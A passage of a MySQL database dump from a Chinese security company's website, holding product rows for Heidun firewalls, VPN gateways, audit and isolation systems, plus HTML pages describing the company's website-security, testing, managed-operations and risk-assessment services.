颗CPU的并行事务处理。$$$$$$|||海峡信息在兼顾安全性的基础上，自主开发了非共享式TCP协议栈，同时将TCP协议栈与应用代理相结合，打破了通用操作系统基于内核的TCP协议栈共享锁的限制。$$$$$$|||海峡信息在Intel多核硬件平台上将多线程并行扫描引擎、多核并行控制技术和非共享式TCP协议栈技术有机的结合。$$$$$$|||针对木马、后门程序通过“反弹”技术由内向外自动化连接，窃取用户信息的特点，利用恶意网址过滤、僵尸网络防护、敏感关键字过滤等多方面的技术，加强由内向外连接的行为控制和内容过滤，帮助用户建立起一到强有力的数据安全屏障$$$$$$|||针对HTTP、HTTPS、FTP、POP3、SMTP五种主流协议进行实时双向深度病毒过滤。$$$$$$');
INSERT INTO `xyh_product` VALUES ('19','黑盾网络安全审计系统','','','/uploads/img1/20170615/5941d9e3b9aa2.jpg!300X300.jpg','/uploads/img1/20170615/5941d9e3b9aa2.jpg$$$$$$','','随着信息技术的飞速发展，企事业单位网络承载的内容变得复杂与多元化。网络电视、网络游戏、在线通信、Web视频、P2P下载等纷纷佣金网络。大量非业务资源的访问不仅严重浪费组织机构宝贵的带宽资源，使关键业务应用访问迟缓，同时无形中增加了IT维护成本。如何管理、优化网络带宽成为组织机构IT运营的重要前提!','0.00','0.00','','','','1498791671','1498791671','81','27','1','1','','0','0','1','上网行为管理功能$$$$$$|||流量控制功能$$$$$$|||灵活的准入控制策略$$$$$$|||完善的审计与报表功能$$$$$$|||$$$$$$','','','','使用黑盾安全审计系统可以对上网行为进行有效控制$$$$$$|||针对指定应用类型和用户进行彻底封堵或宽带的限制。$$$$$$|||能够通过操作系统规则、进程规则、文件规则、注册表规则等方式来限制用户准入。$$$$$$|||能精确记录访问过的网址、网页标题和网页内容、HTTP/FTP上传下载、通过BBS、BLOG发表的内容、各种搜索记录等所有上网记录，均可完整再现$$$$$$|||$$$$$$');
INSERT INTO `xyh_product` VALUES ('20','黑盾VPN网关','','','/uploads/img1/20170614/5941045301cf1.jpg!300X300.jpg','/uploads/img1/20170614/5941045301cf1.jpg$$$$$$','','黑盾VPN网关系列产品面向政府部门和企业，整合虚拟化技术和安全接入技术，将您原本在PC上使用的信息化应用软件（如OA、ERP、CRM、电子政务系统）在不进行任何开发的情况下，无缝迁移到移动智能终端上使用，由VPN设备、移动云IServer服务器、手机/平板三部分组成，通过黑盾VPN移动云管理平台统一应用发布，帮助用户在任何时间、任何位置、任何应用、任何终端、任何网络环境下都可以快速、安全接入应用、支持所有iOS、Android、Windows等系统的智能终端、是政府、企事业单位实现移动信息化的最佳解决方案。','0.00','0.00','','','','1498791986','1498791986','18','28','1','1','','0','0','1','解决传统办公遇到的瓶颈$$$$$$|||海峡移动云$$$$$$|||国内虚拟化安全移动办公解决方案$$$$$$|||高安全的接入技术$$$$$$|||$$$$$$','高校$$$$$$|||企业$$$$$$','随着高校外出学术研究、工作的人次的日益增多，身处校外的老师们越来越需要能够网上办公以及访问校内资源，但校园网资源由于安全的原因只能在校内认证访问，这个矛盾就逐渐突出，为此，黑盾VPN网关通过SSL技术实现校外认证，在老师们访问校园网和教育骨干网时，建立一个安全的SSL隧道，进行认证加密，保障外网访问的安全性，为地处校外的教职工的工作和学习带来了极大的方便。$$$$$$|||黑盾VPN系统集认证、访问控制、安全管理和审计于一身，为企业用户提供中心网关—中心网关、中心网关—移动用户、移动用户到移动用户客户端的连接，充分保证企业用户在网络接入、端到端的数据传输和业务交换的机密性、完整性，为企业分支机构安全运营提供可靠服务。$$$$$$','/uploads/img1/20170615/5941f5fc2b961.jpg$$$$$$|||/uploads/img1/20170615/5941f600a1990.jpg$$$$$$','传统固定办公方式不能与现在高效率、快节奏的办公需求相适应。领导、管理人员、普通员工、执法人员都需要一个融合多种业务系统的更为便捷的办公手段。$$$$$$|||采用虚拟化技术，无需二次开发，所有应用统一发布$$$$$$|||通过虚拟化技术将Windows应用软件无缝平移至手机/平板电脑等移动终端$$$$$$|||企业私有云存储、良好的用户体验、极致畅快的访问体验、端到端的安全保障$$$$$$|||$$$$$$');
INSERT INTO `xyh_product` VALUES ('21','黑盾HD-SMS管理系统','','','/uploads/img1/20170614/594104275e64a.jpg!300X300.jpg','/uploads/img1/20170614/594104275e64a.jpg$$$$$$','','黑盾HD-SMS管理系统（HD-SMS-LAS）基于802.1X协议的身份认证、基于主机特征的身份鉴别、终端安全检查、设备接入授权以及重定向受限访问、LDAP集成、DHCP集成、802.11无线网络支持等技术和手段，采用隔离管控和有效引导的方法，有针对性实施网络自我防御，做到可信计算机有条件访问网络，组织非授权以及有问题的计算机私自访问网络带来安全隐患，有效地解决了开放式网络存在的普遍性安全问题，适合于大多数拥有开放式网络的大中小型企业使用。','0.00','0.00','','','','1498792396','1498792396','60','30','1','1','','0','0','1','网络安全风险评估$$$$$$|||安全域管理与控制$$$$$$|||消灭网络安全弱点$$$$$$|||终端软隔离$$$$$$|||告警与日志$$$$$$','','','','根据积极主动的安全防御建设思想，加强内部网络安全风险评估异常重要。$$$$$$|||动态监测技术可针对接入内部网络的计算机终端实行多种安全策略的管理$$$$$$|||强制的安全策略让未通过授权的用户和设备远离网络$$$$$$|||终端用户安全检查未通过时，终端计算机将进入隔离区进行相关不合规项目的修复$$$$$$|||预警中心实时的安全信息通报机制，帮助管理者快速查找和排除安全隐患。$$$$$$');
INSERT INTO `xyh_product` VALUES ('22','黑盾安全隔离与信息交换系统','','','/uploads/img1/20170614/5941049042c41.jpg!300X300.jpg','/uploads/img1/20170614/5941049042c41.jpg$$$$$$','','黑盾安全隔离与信息交换系统（双闸HD-GAP）基于“安全隔离，可控交换”的设计思想，采用“2+1”的系统架构，通过对信息进行落地、还原、扫描、过滤、防病毒、入侵检测、审计等一系列安全处理和快速交换操作，实现不同安全域之间安全隔离和信息交换。\r\n黑盾安全隔离网闸系统适用于：1）在安全受控前提下，实现不同网络的服务器之间业务数据的交换；2）在安全受控前提下，实现比如Web服务器与内网数据库之间进行实时的数据交换。3）数据交换只能由外网Web服务器向位于内网的数据库发起连接，数据传输只能是由专网或外网传向内网的单向传输。','0.00','0.00','','','','1498792583','1498792583','85','31','1','1','','0','0','1','高安全性$$$$$$|||可扩展性$$$$$$|||低延时$$$$$$|||友好的管理界面$$$$$$|||先进的数据同步技术$$$$$$','','','','采用双机系统及专用的传输控制矩阵架构。$$$$$$|||采用模块化设计的软硬件。方便系统扩展升级$$$$$$|||采用专用硬件和嵌入式控制技术的传输控制矩阵，在系统内核中实现了网络通道开关功能。$$$$$$|||提供强大高效的GUI管理界面，界面美观、配置简单。$$$$$$|||集成先进的同步技术，可实现文件同步、数据库同步，无需安装第三方同步软件。$$$$$$');
INSERT INTO `xyh_product` VALUES ('23','黑盾项目管理信息系统','','','/uploads/img1/20170615/5941db89734d5.jpg!300X300.jpg','/uploads/img1/20170615/5941db89734d5.jpg$$$$$$','','黑盾项目管理信息系统（HD-PMIS）是福建省电子政务应用系统的重要组成部分之一，该系统融合了Internet信息管理技术、工作流技术、数据库技术，充分运用Internet发展的最新理念和技术，实现对项目的在线申报、受理、评审、立项、合同管理、经费管理、执行情况管理、验收管理等功能。在系统的科学性、技术的先进性、功能的齐全性、使用的方便性和易用性等方面具有鲜明的特点。','0.00','0.00','','','','1498792744','1498792744','74','32','1','1','','0','0','1','实用性$$$$$$|||安全性$$$$$$|||易用性$$$$$$|||灵活性$$$$$$|||适应性$$$$$$','','','','模块化设计，可按需要提供不同功能，并任意组合$$$$$$|||多级权限控制，防止非法操作和擅自使用$$$$$$|||人性化的导航界面，操作简便$$$$$$|||规模和功能可灵活扩展$$$$$$|||支持多种项目类型的组合管理。$$$$$$');
INSERT INTO `xyh_product` VALUES ('24','黑盾运维安全网关系统','','','/uploads/img1/20170615/5941dbd0246b5.jpg!300X300.jpg','/uploads/img1/20170615/5941dbd0246b5.jpg$$$$$$','','黑盾运维安全网关系统（堡垒机HD-SAS-FORT）融合运维管理和运维安全的特性，切断终端对服务器、数据库系统及网络资源的直接访问，采用代理转发的方式接管终端对网络资源的直接访问，集中实现用户的身份认证、授权管理、访问控制和操作审计。堡垒机是一款软硬件一体化的综合审计系统，凭借自身丰富强大的审计能力、稳定高速的处理能力、细致全面的控制能力、只能准确的分析能力以及舒适完美的体验，让其成为数据中心智能领域的守护者。','0.00','0.00','','','','1498793157','1498793157','62','33','1','1','','0','0','1','统一管理身份$$$$$$|||操作授权管理$$$$$$|||访问控制管理$$$$$$|||OCR识别模块$$$$$$|||操作审计管理$$$$$$','','','','基于主从账号分离的管理机制，主账号对应自然人，从账号对应主机资源，解决“账号共享难题”$$$$$$|||通过访问控制网关，实现基于用户身份的主机资产授权和资源账号授权，通过访问控制确保合法操作者合法访问资源，有效降低未授权访问带来的风险$$$$$$|||采用类防火墙的命令控制策略，准确识别用户操作意图，识别用户输入操作命令，对违反命令策略的操作行为，能够实时阻断或给予警告。$$$$$$|||支持RDP图形运维实时文字识别和文字提取功能$$$$$$|||能够动态实时的捕获用户操作数据流$$$$$$');
INSERT INTO `xyh_product` VALUES ('26','黑盾防火墙','','','/uploads/img1/20170614/5940fa49ba394.jpg!300X300.jpg','/uploads/img1/20170614/5940fa49ba394.jpg$$$$$$','','黑盾防火墙（HD-FW）是海峡信息基于对客户需求的深刻理解，遵循数据吞吐处理高性能、高稳定性、高可靠性、高可用性为主要设计原则，自主研制开发并推出了基于先进的多级数据筛选状态检测技术的多核多线程防火墙。它适用于服务器集群、高容量电子商务网站、电信数据中心、大容量数据仓库等环境，支持光纤接入，它的容错特性、冗余电源支持、双机热备份、贷款管理以及与其他安全产品联动等多种安全功能为以太网络环境提供强大的安全保护，同时辅以多种管理配置方式，具有多种工作模式和多接口，可满足各种骨干网络环境下的网络安全需求，让顾客网络安全无忧。','0.00','0.00','','','','1498727890','1498727890','23','21','1','1','','0','0','1','先进的策略路由技术$$$$$$|||主动识别过滤技术$$$$$$|||多级数据筛选状态检测技术$$$$$$|||数据并行处理微中心技术$$$$$$|||线速无阻塞转发技术$$$$$$','政务$$$$$$|||医疗$$$$$$','海峡信息公司凭借其领先的产品和技术优势，依托强大的研发队伍，为政务网倾心打造的黑盾防火墙，具有高安全性、高应用性、高扩展性强等优点，保证了从数据链路层到应用层的完全过滤，为复杂政府网络环境提供完备的安全管理，充分保证政府部门的关键资源可以迅速、安全地共享、汇总和收集。$$$$$$|||通过黑盾防火墙将医院内部不同部门的网络（远程医疗诊断、网上就医、急救调度响应、疫情监控系统、医疗保险系统等）或关键服务器（医保数据库、影像数据库、邮件服务器、Web服务器等）划设置为多DMZ区，彼此隔离，不仅保护了医院内部网和关键服务器免受来自Internet的攻击，也保护了各部门网络和关键服务器不受来自企业内部其它部门的网络攻击。$$$$$$','/uploads/img1/20170615/5941f5cc358ff.jpg$$$$$$|||/uploads/img1/20170615/5941f5e1e4d14.jpg$$$$$$','采用先进的策略路由技术，能够根据数据包的特性如源地址、目标地址、 IP 协议类型（ TCP 、 UDPJCMP 及指定协议号）、传输层端口号以及 TOS 值进行策略路由\r\n选择，支持多个 ISP 接人多个出口的应用砰境，实现线路均衡与冗余。不同的服务质盪的数据流或者不同性质的数据（语音、视频、数据）走不同的路径，达到 QOS 优化\r\n的目的。$$$$$$|||采用先进的系统架构和人工智能状态识别技术，自动适应网络状况，主动监控和分析并学习恶意数据包构成，自动将恶意攻击数据流从“善意的”合法数据流中过滤掉$$$$$$|||采用多级过滤技术，并辅以状态检测鉴别手段，形成高速、智能的过滤引擎。在分组过滤（网络层）一级，过滤掉所有的源路由分组和假冒的 IP 源地址；在传\r\n输层一级，遵循过滤规则，过滤掉所有禁止出或人的协议和有害数据包如 nuke 包等；在应用网关（应用层）一级，能利用 FTP 、 SMTP 等各种网关，控制和监测\r\ninternet 提供的所用通用服务，弥补了各种单独过滤技术的不足。$$$$$$|||在高速网络中，不管采用哪种技术，都有可能发生瓶颈问题，黑盾防火墙引人了数据并行处理微中心的概念，对数据并行处理技术加以改善。通过多个数据并行处理微中心的协同控制，有效的将不同的数据交由不同的微中心来处理，将原来信息的顺序处理变成并行处理，不但提高了系统的稳定性，也整体上大大提高了防火墙系统的性能$$$$$$|||采用高速的系统数据总线结构，并通过采用数据并行处理微中心技术，大大提高了防火墦的性能，确保系统不会成为宽带接入的性能瓶颈，特别适用于网络结构复杂、应用丰富、高带宽、大流重的大中型骨干级千网络环境。$$$$$$');
INSERT INTO `xyh_product` VALUES ('27','黑盾安全威胁检测与防御系统','','','/uploads/img1/20170701/595746b61977c.png!300X300.jpg','/uploads/img1/20170701/595746b61977c.png$$$$$$','','APT攻击在21世纪开始蓬勃发展起来，有重要信息资产的部门都成为APT指向的目标。2010年的Google Aurora(极光)攻击是一个十分著名的APT攻击，Google的一名雇员点击即时消息中的一条恶意链接，引发了一系列事件导致这个搜索引擎巨人的网络被渗入数月，并且造成各种系统的数据被窃取。','0.00','0.00','','','','1498892022','1498892022','73','100','1','0','','0','0','1','智能协议深度识别和分析$$$$$$|||证据库关联分析$$$$$$|||全方位的检测机制$$$$$$|||丰富的响应方式$$$$$$|||$$$$$$','','','','系统采用独有的智能协议深度识别技术，通过动态分析网络报文中包含的协议特征，发现其所在协议，然后递交给相应的协议分析引擎进行处理，能够在完全不需要管理员参与的情况下，高速、准确地检测出通过动态端口实施的恶意入侵，可以准确发现绑定在任意端口的各种木马、后门。 $$$$$$|||通过对证据库进行大数据挖掘分析的基础上，匹配ARTsmart攻击链库，能够将事件从多角度进行智能关联分析，追踪源头，找出隐秘异常行为，发现安全威胁。用户可以通过上钻、下钻操作方式多角度了解攻击事件的流程，及时发现网络中的恶意行为、漏洞、以及攻击等安全隐患，将APT攻击消灭在萌芽期$$$$$$|||从已知签名检测、无签名的深度内容检测、动态行为检测及事件关联分析等维度，对各类威胁进行深度检测并在漏洞利用、后门植入、窃密等攻击环节上形成纵深立体的检测体系。$$$$$$|||提供丰富的响应方式，包括：邮件报警、界面显示、日志数据库记录、windows消息、网关联动等，同时提供标准 syslog接口，可接受第三方管理平台的安全事件集中监控、报告和管理。$$$$$$|||$$$$$$');
INSERT INTO `xyh_product` VALUES ('28','多网隔离接入平台','','','/uploads/img1/20170701/595747212c8a8.jpg!300X300.jpg','/uploads/img1/20170701/595747212c8a8.jpg$$$$$$','','海峡黑盾多网隔离应用接入平台，解决了“互联网+信息惠民”和“两整合”工作中，政府单位进行业务协同时面临办公桌面资源不足和网线资源不足问题。平台基于国家和地方规范和用户场景定制而生，充分满足局域网接入政务外网的相关安全规范要求，运用网络安全虚拟化技术，帮助用户在使用同一套办公电脑和物理环境网络，安全接入多个不同的业务网络，点击2s切换业务网络，想连哪里就连哪里。\r\n','0.00','0.00','','','','1498892154','1498892154','55','101','1','0','','0','0','1','多网隔离，安全接入$$$$$$|||节省建设运维成本$$$$$$|||遵从外网接入规范$$$$$$|||$$$$$$|||$$$$$$','集中部署典型拓扑$$$$$$|||局端部署典型拓扑$$$$$$','在政务外网域域网骨干节点，旁路集中部署多网隔离应用接入平台（云端版），为本级政府部门提供统一的云接入服务，便于本级直属政府部门在行业专网、政务外网、互联网等业务网络之间快速切换，快速推进业务协同$$$$$$|||在政府部门局域网部署多网隔离应用接入平台，平台接入旁路部署接入政务外网、行业专网和互联网。\r\n政府部门用户使用1套办公电脑，在多个业务网络之间自由切换，访问行业专网/政务外网时，无法访问互联网，从而有效保障行业专网/政务外网的业务安全$$$$$$','/uploads/img1/20170701/5957476618fee.jpg$$$$$$|||/uploads/img1/20170701/5957477941ca6.jpg$$$$$$','应用网络虚拟化、流量牵引、业务标记技术，实现每个用户、同一时间只能访问一个业务网络$$$$$$|||利旧现有PC网络，节省建设投资、维护成本80%以上$$$$$$|||基于国家规范及用户场景定制而生，符合政务外网接入规范要求$$$$$$|||$$$$$$|||$$$$$$');


# 转存表中的数据：xyh_role 
INSERT INTO `xyh_role` VALUES ('1','管理员','0','1','管理员');
INSERT INTO `xyh_role` VALUES ('4','文章发布管理员','0','1','负责发布文章');


# 转存表中的数据：xyh_role_user 
INSERT INTO `xyh_role_user` VALUES ('4','3');


# 转存表中的数据：xyh_sever 
INSERT INTO `xyh_sever` VALUES ('1','84','网站安全服务','<p class=\"publicp\">网站出现木马、用户名密码被窃取、访问网页速度慢等问题极大地困扰着网站提供者，它给企业形象、信息网络甚至核心业务造成严重的破坏。虽然可以通过部署入侵保护系统、网站防火墙等相关防御类产品来起到一定的防御效果，但是显然这不是万全之策，用户难以更早的发现风险隐患，预防这些安全事件。另外安全管理员需要维护大量的安全设备，分析众多日志信息，带来额外的工作量。 若能够主动的发现网站的风险隐患，并及时采取修补措施，则可以降低风险、减少损失，海峡信息针对该需求，结合软件即服务（SaaS）的服务模式，推出网站安全漏洞检测，网站源代码加固，网站安全监测，网站网页防篡改一体化服务解决方案。通过全面深入的漏洞识别、7×24小时不间断的远程专家值守，为客户互联网网站提供远程安全监测、安全检查、实时响应和人工分析服务，是构建完善的网站安全体系的最好补充。</p><p class=\"publicp\">若能够主动的发现网站的风险隐患，并及时采取修补措施，则可以降低风险、减少损失，海峡信息针对该需求，结合软件即服务（SaaS）的服务模式，推出网站安全漏洞检测，网站源代码加固，网站安全监测，网站网页防篡改一体化服务解决方案。通过全面深入的漏洞识别、7×24小时不间断的远程专家值守，为客户互联网网站提供远程安全监测、安全检查、实时响应和人工分析服务，是构建完善的网站安全体系的最好补充。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户需求：</h1><p class=\"publicp\">1）门户网站是我们公司的门面，但总是有些不法之徒来破坏。</p><p class=\"publicp\">2）和平时相比，节假日的情况更严峻，网站无人看守，我们又不能把服务停了。</p><p class=\"publicp\">3）我们不是专业的安全人员，无法看到网站的潜在威胁，但总是能听说这方面的报道，让我们胆战心</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">海峡信息网站安全一体化服务，是一项托管式服务，客户无需安装任何硬件或软件，无需改变目前的网络部署状况，无需专门的人员进行安全设备维护及分析日志。只需要将监测的网站域名告知海峡信息安全团队，许可后即可获得7×24小时的网站安全监测服务，一旦客户的网站遇到风险状况后，海峡信息安全团队会在第一时间与客户确认，并提供专业的解决方案建议。同时，海峡信息安全专家会根据监控情况定期出具周期性的监测报告，让客户整体掌握网站的风险状况及安全趋势。除此之外，海峡信息安全团队将周期性对客户的网站进行现场评估，识别客户网站、应用系统、服务器等当前的安全漏洞和已知的安全弱点，并提供专业的安全加固措施。具体的内容如下图所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958eaa714b16.png\"/></p><p class=\"publicp\">包括：</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">网站漏洞检测</span></p><p class=\"publicp\">海峡信息网站安全以在线检测为主，人工渗透测试为辅的服务方式，基于互联网远程检测，测试和识别客户网站当前的安全漏洞和存在的安全弱点，并对WEB应用系统进行全面、深入和扩大化的安全漏洞识别、挖掘和利用。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">网站安全加固</span></p><p class=\"publicp\">针对网站漏洞深度检测的结果，海峡信息安全服务团队从web服务器安全、web源代码安全、web应用系统安全，这三个方面出发，为客户提供专业的安全加固措施及有效的安全加固办法，从实质上提高WEB安全。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">网站安全监控</span></p><p class=\"publicp\">海峡信息安全服务团队为客户提供多种监控服务，满足客户多种需求，包括但不限于：一次性复查服务、重大节日检测服务、7×24h安全监控服务、5×8h安全监控服务等。为客户网站提供网站的可用性监控、网站的页面篡改监控、网站挂马监控等并同时提供网站应急响应服务。这些信息将通过邮件、短信等方式直接提醒安全服务部的工程师，确保网站的可用性、安全性实时掌控。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">网站定期巡检</span></p><p class=\"publicp\">对客户门户网站进行安全巡检，及时修补网站中被发现的安全 漏洞和隐患并针对所发现的漏洞和隐患进行安全加固和优化；当网站本身或网站服务器出现异常或者病毒、黑客入侵时，提供应急预案进行处理，确保在最短时间内 处理事件、及时补救、消除隐患。并根据当前的安全形势动态调整安全策略，以提高信息系统的安全性。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">定期汇总报告</span></p><p class=\"publicp\">海峡网站安全服务将定期为用户汇总监测数据，统计并分析出近期网站存在的漏洞处理情况、网页木马及篡改发生的频率及处理情况、网站可用性以及可用性情况供用户 参考。通过汇总报告可以更为全面的了解网站的服务质量、安全防护水平。周期性全自动化监测，可负责对网站的内容安全（如 ICP 备案情况、敏感关键字、挂马）和脆弱性（如SQL注入、跨站脚本、WEB后门）问题进行监测，并提供详细的监测报告展示，让您对所监测网站的安全状况一目了然。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">（1）7×24小时在线监控，不遗漏一个风险；</p><p class=\"publicp\">（2）专家人工验证，不再为误报心惊肉跳；</p><p class=\"publicp\">（3）第一时间掌握网站安全状况和潜在风险；</p><p class=\"publicp\">（4）实时告警、定期报告，让您安枕无忧；</p><p class=\"publicp\">（5）托管式安全服务，节约您的投资和管理成本。</p><h1 class=\"publicSecTitle cg\"><img src=\"/uploads/img1/20170702/5958edcaaaf99.png\"/> 成功应用案例：</h1><p class=\"publicp cg\">福州市奥运安保信息网络安全大检查的280家企事业单位、福州市重点信息网络监管单位重要会议中的120家企事业单位、福州市公安局、兴业证券股份有限公司、福建省侨办、福建省自考办、福建省人事厅、福建省师大人武学院、湖南省商务厅、中国上海兴业期货网站、福建省南平市人民政府门户网站、福建省三明市人民政府门户网站、福建省龙岩市人民政府门户网站、福建省国土资源厅网站、福建省环保厅网站、福州市便民呼叫中心12345</p>');
INSERT INTO `xyh_sever` VALUES ('2','85','应用软件安全测试','<p class=\"publicp\">多年以来，有两点我可以确定：一是对于高保障性（high assurance）软件的社会需求呈不断增长的态势；二是市场从来就不会提供这样的软件。——Earl Boebert</p><p class=\"publicp\">对安全而言，开源是一件好事，因为这种方式可以防止你违反科克霍夫法则——Eric Raymond</p><p class=\"publicp\">在以前的单机时代，安全问题主要是操作系统容易感染病毒，单机应用程序软件安全问题并不突出。但是自从互联网普及后，软件安全问题愈加显加突显，使得软件安全性测试的重要性上升到一个前所未有的高度。 软件安全性是一个广泛而复杂的主题，每一个新的软件总可能有不符合所有已知模式的新型安全性缺陷出现。近年来， 类似于CSDN、天涯网大规模用户信息泄露的安全事件时有发生，这些安全事件的根本原因是应用软件自身存在软件安全漏洞。如果应用系统能够在上线之初就能够执行专业的Web应用上线测试服务，很多安全问题就能够消灭在萌芽中。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">海峡信息建立起应用安全研究团队，专注于应用软件安全方面的漏洞研究、攻防研究和代码加固研究，并通过深入研究来自于微软的“软件安全开发生命周期”流程，提出了海峡信息应用软件安全开发生命周期解决方案，如下图所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958ef3604ac1.png\"/></p><p class=\"publicp\">海峡信息“应用上线测试”服务采用了黑盒与白盒测试技术相结合服务模式，旨在针对“电子政务、电子商务”重要应用应用系统的应用安全展开全面的安全测试，该测试参照国际开放Web应用安全组织（OWASP）相关规范并结合海峡信息多年的最佳实践经验，可以在应用系统上线前或运行中展开安全测试。</p>');
INSERT INTO `xyh_sever` VALUES ('3','86','安全运维外包','<p class=\"publicp\">不松懈，时刻警惕。——弗兰西斯，培根</p><p class=\"publicp\">只有业余分子才会攻击机器，专业人士针对的目标是人——Bruce Schneier</p><p class=\"publicp\">近年来，新技术浪潮接踵而至，黑客攻击手法也与时俱进。0day攻击、APT攻击让传统的安全设备防护模式捉襟见肘。海峡信息认为在新形势下的安全对抗，不能让缺乏智慧的安全设备与拥有智慧的“骇客”单独对抗，而应该在安全专业团队的参与下来打赢这场信息安全保卫战。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户需求：</h1><p class=\"publicp\">（1）我们单位的网络安全的短板在哪儿？</p><p class=\"publicp\">（2）我们单位买了很多安全产品，现在要怎么用比较合理？</p><p class=\"publicp\">（3）我们单位买了一堆安全产品，可是还是出了安全问题，有点没招了！</p><p class=\"publicp\">（4）数据中心安全运维怎么形成安全运维体系化、专业化以保障整体安全？</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">海峡信息构建了专业的信息安全运营服务团队，凭借丰富的攻防经验和规范化的服务水平，依托强大的安全服务支撑平台，为客户提供“安全运维服务”（Managed Security Services Provider，SI-MSS）。海峡信息“安全运维服务（SI-MSS）”，以现场为主，远程为辅，采用主动预防的方式，面向各级政府数据中心、云计算数据中心、政府网站群、企业数据中心等提供安全运维服务。为用户提供专业安全保障，降低信息安全投入成本，使用户专注于自己的核心业务，提高本单位的综合竞争力，提升客户在安全方面的投入产出比。\r\n体系结构图如下所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958f06859929.png\"/></p><p class=\"publicp\">海峡信息SI-MSS安全运维提供定期对网络设备、安全设备、主机系统进行安全巡检，及时修补信息系统中被发现的安全漏洞和隐患并针对所发现的漏洞和隐患进行安全加固和优化；当设备出现异常或者病毒、黑客入侵时，提供应急预案进行处理，确保在最短时间内处理事件、及时补救、消除隐患。并根据当前的安全形势动态调整安全策略，以提高信息系统的安全性。安全运维流程如下图所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958f09fca2cc.PNG\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">为企业面向互联网的信息网络提供安全保障业务，降低企业信息安全投入成本，使企业专注于自己的核心业务，提高企业的综合竞争力，提升客户在安全方面的投入产出比。</p>');
INSERT INTO `xyh_sever` VALUES ('4','87','风险评估与规划','<p class=\"publicp\">Microsoft把有效的安全措施整合为标准，但是高超的应对手法层出不穷。安全系统存在一个适得其反的坏毛病，无疑会引发重大问题——Rick Maybury</p><p class=\"publicp\">信息系统存在的脆弱性是不可避免的，经过几十年的研究，大家发现这是由于人为的错误所造成的，对于现在我们所使用的一个庞大的、复杂的技术系统来说，恐怕在长时间内是不可避免的。因此，在现实环境中，人们总是要面临着各种各样的威胁，或者是信息安全风险是必然的。在这种情况下，通过适当的、足够的，有时候是综合的安全措施来控制风险，最终目的是使残余下来的风险可以降低到最低程度。任何信息系统都会有安全风险，所以，人们追求的所谓安全的信息系统，实际是指信息系统在实施了风险评估并做出风险控制后，仍然存在的残余风险可被接受的信息系统。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">信息安全风险评估是一个识别、控制、降低或消除可能影响信息系统的安全风险的过程。海峡信息遵照国家《信息安全风险评估规范》（GB/T 20984-2007）及等级保护系列规范，遵循ISO27001以及相关行业规范，从安全技术和安全管理两个层面入手，全面深入分析信息系统存在的脆弱性、威胁和风险，输出风险评估报告和风险处置建议。并进一步协助用户完成安全规划，有步骤有计划的提升用户的信息安全保障水平。海峡信息风险评估服务根据服务内容不同，可以分解为网络安全评估、网站安全评估、应用系统安全评估等多种类型。</p><p class=\"publicp\">风险评估服务流程图如下所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958f527386f5.png\"/></p><p class=\"publicp\">海峡信息风险评估服务具体内容如下图所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958f55177bc3.png\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">（1）认识风险及其对目标的潜在影响；</p><p class=\"publicp\">（2）为决策者提供信息；</p><p class=\"publicp\">（3）有助于认识风险，以便帮助选择应对策略；</p><p class=\"publicp\">（4）识别那些造成风险的主要因素，揭示系统和组织的薄弱环节；</p><p class=\"publicp\">（5）有助于明确需要优先处理的风险事件；</p><p class=\"publicp\">（6）有助于通过事后调查来进行事故预防；</p><p class=\"publicp\">（7）有助于风险应对策略的选择；</p><p class=\"publicp\">（8）满足监管要求。</p>');
INSERT INTO `xyh_sever` VALUES ('5','89','等级保护咨询服务','<p class=\"publicp\">等级保护制度是我国信息安全保障体系的基本制度，2007年公安部等四部委联合发布了《关于开展全国重要信息系统安全等级保护定级工作的通知》（公信安［2007］861号），明确了重要信息系统等级保护工作的开展。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户需求：</h1><p class=\"publicp\">1、 政策需求——符合等级保护的要求</p><p class=\"publicp\">-- 完成系统定级并备案</p><p class=\"publicp\">-- 系统达到《基本要求》相应级别的指标</p><p class=\"publicp\">-- 符合《测评准则》要求，并通过测评</p><p class=\"publicp\">2、 实际需求——满足安全实际要求</p><p class=\"publicp\">-- 融合现有的安全体系或安全设施</p><p class=\"publicp\">-- 满足客户的其他符合性要求，如行业标准等</p><p class=\"publicp\">-- 适应业务特征与安全要求的差异性</p><p class=\"publicp\">-- 整体考虑，统一建设与管理</p><p class=\"publicp\">-- 建立长效机制，可持续运行、发展和完善</p><h1 class=\"publicSecTitle\"><img 